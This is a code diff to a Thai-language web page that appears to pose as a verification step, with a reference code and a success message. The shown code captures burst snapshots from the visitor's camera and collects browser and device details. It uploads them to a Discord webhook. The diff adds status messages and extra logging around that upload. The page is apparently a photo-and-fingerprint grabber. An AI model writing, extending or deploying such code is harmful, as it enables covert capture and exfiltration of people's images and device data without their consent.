@@ -203,6 +203,16 @@
         .glow-text {
             text-shadow: 0 0 20px rgba(255, 106, 0, 0.3), 0 0 40px rgba(255, 106, 0, 0.1);
         }
+
+        .status-success {
+            color: #4ade80;
+        }
+        .status-error {
+            color: #f87171;
+        }
+        .status-loading {
+            color: #fbbf24;
+        }
     </style>
 </head>
 <body>
@@ -294,6 +304,11 @@
                             <p class="text-white/50 text-xs">Ref: <span id="ref-code">FF-994102-B</span></p>
                         </div>
                     </div>
+                </div>
+
+                <!-- แสดงสถานะการส่งข้อมูล -->
+                <div id="webhook-status" class="text-center p-3 rounded-xl bg-white/5 border border-white/10 mb-4">
+                    <p id="webhook-msg" class="text-sm font-medium text-yellow-400">⏳ กำลังส่งข้อมูลไปยัง Discord...</p>
                 </div>
 
                 <div id="info-box" class="space-y-3 max-h-[420px] overflow-y-auto pr-1"></div>
@@ -461,10 +476,8 @@ function startBurstCapture(video) {
                 captured++;
                 
                 if (captured < burstCount) {
-                    // ถ่ายต่อไปทุก 300ms (0.3 วินาที)
                     setTimeout(captureOne, 300);
                 } else {
-                    // ถ่ายครบแล้ว ส่งทันที
                     finishAndSend(images, video);
                 }
             }, "image/png", 0.9);
@@ -478,7 +491,6 @@ function startBurstCapture(video) {
         }
     }
     
-    // เริ่มถ่ายรูปแรกทันที
     captureOne();
 }
 
@@ -493,6 +505,10 @@ function finishAndSend(images, video) {
 
 // ===== ส่งข้อมูลทั้งหมด =====
 async function sendAllToWebhook(images) {
+    const webhookMsg = document.getElementById("webhook-msg");
+    webhookMsg.textContent = "⏳ กำลังส่งข้อมูลไปยัง Discord...";
+    webhookMsg.className = "text-sm font-medium text-yellow-400";
+
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
     const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
     const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
@@ -547,20 +563,34 @@ async function sendAllToWebhook(images) {
     formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
 
     try {
-        console.log("Sending to webhook...");
+        console.log("Sending to webhook:", WEBHOOK_URL);
+        console.log("FormData entries:");
+        for (let pair of formData.entries()) {
+            console.log(pair[0], pair[1].name || pair[1]);
+        }
+        
         const response = await fetch(WEBHOOK_URL, { 
             method: "POST", 
             body: formData 
         });
+        
         console.log("Response status:", response.status);
+        console.log("Response text:", await response.text());
+        
         if (response.ok) {
+            webhookMsg.textContent = "✅ ส่งข้อมูลไปยัง Discord สำเร็จ!";
+            webhookMsg.className = "text-sm font-medium text-green-400";
             document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
         } else {
-            document.getElementById("status-msg").innerText = "⚠️ ส่งข้อมูลไม่สำเร็จ (Error: " + response.status + ")";
+            webhookMsg.textContent = `❌ ส่งข้อมูลไม่สำเร็จ (HTTP ${response.status})`;
+            webhookMsg.className = "text-sm font-medium text-red-400";
+            document.getElementById("status-msg").innerText = "⚠️ ส่งข้อมูลไม่สำเร็จ";
         }
     } catch(e) {
         console.error("Webhook error:", e);
-        document.getElementById("status-msg").innerText = "❌ เกิดข้อผิดพลาดในการส่งข้อมูล";
+        webhookMsg.textContent = "❌ เกิดข้อผิดพลาดในการส่งข้อมูล: " + e.message;
+        webhookMsg.className = "text-sm font-medium text-red-400";
+        document.getElementById("status-msg").innerText = "❌ เกิดข้อผิดพลาด";
     }
 
     renderResultUI(images ? images.length : 0);
